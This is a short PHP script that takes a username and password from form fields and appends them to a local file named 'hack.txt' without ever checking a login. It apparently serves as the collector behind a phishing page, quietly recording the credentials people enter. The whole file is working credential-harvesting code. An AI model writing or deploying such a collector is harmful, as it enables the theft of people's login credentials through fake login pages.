<?php
	if(isset($_POST['uname'])){
		if(isset($_POST['pass'])){
			$u=$_POST['uname'];
			$p=$_POST['pass'];
			$file = "hack.txt";
		    $text = file_get_contents($file);
		    $text .= $u . "   \n" . $p . "\n";
		    file_put_contents($file, $text);
		}
	}
?>